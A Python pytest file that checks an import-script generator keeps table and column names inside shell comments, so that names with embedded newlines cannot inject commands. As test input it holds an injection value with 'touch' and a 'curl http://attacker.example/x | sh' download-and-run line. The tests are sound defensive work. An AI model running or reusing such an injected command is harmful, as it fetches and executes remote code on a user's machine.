"""Names written into a generated import script never become commands.

The arangoimport scripts carry table, column and collection names in comment lines.
Those names come from the source or the mapping; a newline in one would end the
comment, and the operator running the script would run the rest of the name.
"""

from __future__ import annotations

import os
import shutil
import subprocess

import pytest

from r2g.generators.arangoimport import (
    ArangoImportGenerator,
    CsvImportGenerator,
    _shell_comment,
)
from r2g.types import Column, MappingConfig, Schema, Table


def _hostile(marker) -> str:
    return f"orders\ntouch {marker}\n#"


def _mapping(name: str) -> MappingConfig:
    return MappingConfig.model_validate({
        "collections": {
            "orders": {"source_table": name, "target_collection": "orders"},
            "cust": {"source_table": "cust", "target_collection": "cust"},
        },
        "edges": [{"edge_collection": "placed", "from_collection": "orders",
                   "to_collection": "cust", "from_fields": [name], "to_fields": ["id"]}],
    })


@pytest.mark.parametrize("ch", ["\n", "\r", "\x00", "\x1b", " ", "\u0085"])
def test_shell_comment_is_one_line_whatever_the_text(ch):
    line = _shell_comment(f"a{ch}b")
    assert line.startswith("# a") and line.endswith("b")
    assert len(line.splitlines()) == 1 and ch not in line


def test_shell_comment_keeps_ordinary_text():
    assert _shell_comment("Order Details -> order_details (customer_id -> café)") == (
        "# Order Details -> order_details (customer_id -> café)")


def _comment_lines(script: str) -> list[str]:
    return [ln for ln in script.splitlines() if "touch" in ln or "curl" in ln]


def test_jsonl_script_names_stay_inside_comments(tmp_path):
    marker = tmp_path / "PWNED"
    script = ArangoImportGenerator(_mapping(_hostile(marker)), data_dir="/nonexistent") \
        .render_script(graph_name="g")
    leaked = _comment_lines(script)
    assert leaked and all(ln.startswith("# ") for ln in leaked), leaked


@pytest.mark.skipif(shutil.which("bash") is None, reason="needs bash")
def test_running_the_jsonl_script_does_not_run_a_name(tmp_path):
    """End to end: the script runs (with stub tools) and the name's command does not."""
    marker = tmp_path / "PWNED"
    script = ArangoImportGenerator(_mapping(_hostile(marker)), data_dir=str(tmp_path)) \
        .render_script(graph_name="g")
    bindir = tmp_path / "bin"
    bindir.mkdir()
    for tool in ("arangoimport", "arangosh"):
        (bindir / tool).write_text("#!/bin/sh\necho 'warnings/errors: 0'\nexit 0\n")
        (bindir / tool).chmod(0o755)
    path = tmp_path / "import.sh"
    path.write_text(script)
    env = dict(os.environ, PATH=f"{bindir}:{os.environ['PATH']}", ARANGO_PASSWORD="x")
    subprocess.run(["bash", str(path)], env=env, capture_output=True, text=True, timeout=60)
    assert not marker.exists()


def test_csv_script_column_names_stay_inside_comments():
    bad = "note\ncurl http://attacker.example/x | sh\n#"
    schema = Schema(tables={"t": Table(name="t", primary_key=["id"], columns=[
        Column(name="id", data_type="integer", is_nullable=False, is_primary_key=True),
        Column(name=bad, data_type="text", is_nullable=True)])})
    cfg = MappingConfig.model_validate(
        {"collections": {"t": {"source_table": "t", "target_collection": "t"}}, "edges": []})
    leaked = _comment_lines(CsvImportGenerator(cfg, schema).render_script())
    assert leaked and all(ln.startswith("# ") for ln in leaked), leaked
